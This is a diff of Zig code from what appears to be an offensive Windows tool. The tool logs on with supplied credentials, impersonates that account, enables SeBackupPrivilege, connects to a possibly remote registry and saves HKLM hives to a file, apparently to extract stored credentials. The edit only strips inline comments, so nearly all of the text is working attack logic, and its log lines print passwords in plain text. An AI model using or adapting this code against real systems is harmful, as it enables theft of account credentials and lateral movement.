@@ -81,13 +81,12 @@ const Target = struct {
         std.log.debug("[+] Attempting LogonUserA({s}, {s}, {s})", .{ username, domain, password });
         // https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-logonusera
         if (0 == win32.LogonUserA(
-            username, //                                    [in]           LPCSTR  lpszUsername,
-            domain, //                                      [in, optional] LPCSTR  lpszDomain,
-            password, //                                    [in, optional] LPCSTR  lpszPassword,
-            win32.LOGON32_LOGON_NEW_CREDENTIALS, //         [in]           DWORD   dwLogonType,
-            win32.LOGON32_PROVIDER_WINNT50, //              [in]           DWORD   dwLogonProvider,
-            &self.token, //                                 [out]          PHANDLE phToken
-
+            username,
+            domain,
+            password,
+            win32.LOGON32_LOGON_NEW_CREDENTIALS,
+            win32.LOGON32_PROVIDER_WINNT50,
+            &self.token,
         )) {
             std.log.err("[!] Failed LogonUserA {s}\\{s}:{s} :: error code ({d})", .{ domain, username, password, GetLastError() });
             return false;
@@ -95,7 +94,7 @@ const Target = struct {
 
         // https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateloggedonuser
         if (0 == win32.ImpersonateLoggedOnUser(
-            self.token, // [in] HANDLE hToken
+            self.token,
         )) {
             std.log.err("[!] Failed ImpersonateLoggedOnUser :: error code ({d})", .{GetLastError()});
             return false;
@@ -116,9 +115,9 @@ const Target = struct {
 
         // https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegevaluea
         if (0 == win32.LookupPrivilegeValueA(
-            @ptrFromInt(0), //          [in, optional] LPCSTR lpSystemName,
-            win32.SE_BACKUP_NAME, //    [in]           LPCSTR lpName,
-            &luid, //                   [out]          PLUID  lpLuid
+            @ptrFromInt(0),
+            win32.SE_BACKUP_NAME,
+            &luid,
         )) {
             std.log.err("[!] Failed LookupPrivilegeValueA :: error code ({d})", .{GetLastError()});
             return false;
@@ -149,12 +148,12 @@ const Target = struct {
 
         // https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges
         if (0 == win32.AdjustTokenPrivileges(
-            token, //                           [in]            HANDLE            TokenHandle,
-            0, //                               [in]            BOOL              DisableAllPrivileges,
-            &tp, //                             [in, optional]  PTOKEN_PRIVILEGES NewState,
-            @sizeOf(win32.TOKEN_PRIVILEGES), // [in]            DWORD             BufferLength,
-            @ptrFromInt(0), //                  [out, optional] PTOKEN_PRIVILEGES PreviousState,
-            @ptrFromInt(0), //                  [out, optional] PDWORD            ReturnLength
+            token,
+            0,
+            &tp,
+            @sizeOf(win32.TOKEN_PRIVILEGES),
+            @ptrFromInt(0),
+            @ptrFromInt(0),
         )) {
             const result = GetLastError();
             if (result == @intFromEnum(win32.WIN32_ERROR.ERROR_INVALID_HANDLE)) {
@@ -195,9 +194,9 @@ const Target = struct {
         // https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regconnectregistrya
         std.log.debug("[+] Calling RegConnectRegistryA({s}, HKLM, hKey)", .{source});
         result = win32.RegConnectRegistryA(
-            if (self.source.?.len > 0) source else @ptrFromInt(0), //    [in, optional] LPCSTR lpMachineName,
-            win32.HKEY_LOCAL_MACHINE, //                                                                [in]           HKEY   hKey,
-            &local_machine, //                                                                          [out]          PHKEY  phkResult
+            if (self.source.?.len > 0) source else @ptrFromInt(0),
+            win32.HKEY_LOCAL_MACHINE,
+            &local_machine,
         );
         if (result != win32.WIN32_ERROR.NO_ERROR) {
             if (@intFromEnum(result) == @intFromEnum(win32.RPC_STATUS.RPC_S_INVALID_NET_ADDR)) {
@@ -217,11 +216,11 @@ const Target = struct {
             std.log.debug("[+] Calling RegOpenKeyExA(HKLM, {s}, BACKUP|LINK, ALL_ACCESS, hKey)", .{hive});
             // https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeyexa
             result = win32.RegOpenKeyExA(
-                local_machine, //                                   [in]           HKEY   hKey,
-                hive, //                                            [in, optional] LPCSTR lpSubKey,
-                REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK, //[in]           DWORD  ulOptions,
-                win32.KEY_READ, //                                  [in]           REGSAM samDesired,
-                &hive_key, //                                       [out]          PHKEY  phkResult
+                local_machine,
+                hive,
+                REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK,
+                win32.KEY_READ,
+                &hive_key,
             );
 
             if (result != win32.WIN32_ERROR.NO_ERROR) { // ERROR_SUCCESS == NO_ERROR
@@ -256,9 +255,9 @@ const Target = struct {
                 std.log.debug("[+] Calling RegSaveKeyA(hKey, {s}, null)", .{destination});
                 // https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsavekeya
                 result = win32.RegSaveKeyA(
-                    hive_key.?, //      [in]           HKEY                        hKey,
-                    @as([*:0]const u8, destination), //     [in]           LPCSTR                      lpFile,
-                    @ptrFromInt(0), //  [in, optional] const LPSECURITY_ATTRIBUTES lpSecurityAttributes
+                    hive_key.?,
+                    @as([*:0]const u8, destination),
+                    @ptrFromInt(0),
                 );
                 if (result != win32.WIN32_ERROR.NO_ERROR) {
                     if (result == win32.WIN32_ERROR.ERROR_INVALID_PARAMETER) {
@@ -278,7 +277,7 @@ const Target = struct {
 
             // https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regclosekey
             result = win32.RegCloseKey(
-                hive_key, // [in] HKEY hKey
+                hive_key,
             );
             if (result != win32.WIN32_ERROR.NO_ERROR) {
                 std.log.err("[!] Failed RegCloseKey :: error code ({d}) on {s}", .{ @intFromEnum(result), hive });
@@ -292,7 +291,7 @@ const Target = struct {
 
         // https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regclosekey
         result = win32.RegCloseKey(
-            local_machine, // [in] HKEY hKey
+            local_machine,
         );
         if (result != win32.WIN32_ERROR.NO_ERROR) {
             std.log.err("[!] Failed RegCloseKey :: error code ({d}) on HKLM", .{@intFromEnum(result)});
